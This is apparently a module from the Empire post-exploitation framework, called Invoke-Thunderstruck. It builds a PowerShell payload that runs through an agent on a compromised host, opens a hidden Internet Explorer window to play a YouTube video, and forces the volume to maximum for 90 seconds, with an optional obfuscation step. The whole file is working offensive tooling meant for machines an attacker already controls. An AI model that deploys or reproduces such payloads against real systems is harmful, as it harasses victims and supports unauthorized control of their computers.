from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Invoke-Thunderstruck',
            'Author': ['@obscuresec'],
            'Description': ("Play's a hidden version of AC/DC's Thunderstruck video while "
                            "maxing out a computer's volume."),
            'Background' : True,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'powershell',
            'MinLanguageVersion' : '2',
            'Comments': [
                'https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot'
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VideoURL' : {
                'Description'   :   'Other YouTube video URL to play instead of Thunderstruck.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
Function Invoke-Thunderstruck
{
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String] $VideoURL = "https://www.youtube.com/watch?v=leJ_wj7mDa0"
    )
    Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
    Set-Speaker -Volume 50   
    $IEComObject = New-Object -com "InternetExplorer.Application"
    $IEComObject.visible = $False
    $IEComObject.navigate($VideoURL)
    Start-Sleep -s 5
    $EndTime = (Get-Date).addseconds(90)
    do {
       $WscriptObject = New-Object -com wscript.shell
       $WscriptObject.SendKeys([char]175)
    }
    until ((Get-Date) -gt $EndTime)
} Invoke-Thunderstruck"""
        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "computername":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        script += "; 'Agent Thunderstruck.'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script